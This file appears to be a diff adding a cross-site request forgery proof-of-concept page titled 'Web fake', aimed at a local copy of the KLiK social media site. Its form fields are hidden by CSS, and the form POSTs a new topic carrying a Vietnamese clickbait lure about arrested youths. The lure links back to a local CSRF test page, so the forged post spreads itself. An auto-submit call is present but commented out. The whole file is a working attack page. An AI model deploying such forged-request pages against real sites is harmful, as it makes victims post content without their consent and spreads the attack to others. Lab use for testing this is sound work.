@@ -1,0 +1,47 @@
+<style>
+  input {
+    display: none;
+  }
+  
+  input[type="submit"] {
+    display: block;
+  }
+  </style>
+  <!DOCTYPE html>
+  <html lang="en">
+    <head>
+    <title>Web fake</title>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    
+    <!-- import the webpage's stylesheet -->
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/semantic-ui/2.4.1/semantic.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/semantic-ui/2.4.1/semantic.min.css">
+    <link rel="stylesheet" href="/style.css">
+    
+  </head>  
+  <body>
+<div class="ui text container" style="margin-top: 1rem">
+  <h1 class="ui dividing header">Web fake</h1>
+ <img class="ui image rounded fluid" style="margin-bottom: 1rem" src="https://image.tienphong.vn/w1000/Uploaded/2023/aohuooh/2023_03_08/nhom-thieu-nien-6927.jpeg">
+ <form action="
+  http://localhost/KLiK-SocialMediaWebsite-master/includes/create-topic.inc.php" method="POST" id="frm">
+    
+  <input 
+  type="text"
+  name="topic-subject"
+  value='bắt giữ đối tượng là  nhóm thanh niên, xem <a href= "http://localhost/CSRF/testcsrf.html">thêm...</a>'
+  />
+    <input  name="topic-cat"
+    value='13'/>
+    <input  name="post-content"
+    value='bắt giữ đối tượng là nhóm thanh niên, xem <a href= "http://localhost/CSRF/testcsrf.html">thêm...</a>'/>
+    <input type="submit"  name="create-topic"  class="ui button primary fluid" />
+  </form>
+  <script>
+    document.addEventListener("DOMContentLoaded", ready);
+    //document.getElementById("frm").submit();
+    </script>
+</body>
+</html>
